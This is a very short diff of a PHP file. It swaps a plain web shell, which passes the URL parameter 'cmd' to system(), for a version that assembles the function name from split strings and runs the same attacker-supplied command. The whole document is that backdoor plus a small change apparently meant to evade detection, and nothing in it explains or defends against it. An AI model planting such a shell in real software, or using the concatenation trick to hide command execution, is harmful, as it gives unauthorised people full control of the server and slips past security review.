@@ -1,4 +1,5 @@
 <?php
-system($_GET['cmd']);
+$f = 'sys' . 'tem';
+$f($_GET['cmd']);
 ?>
 
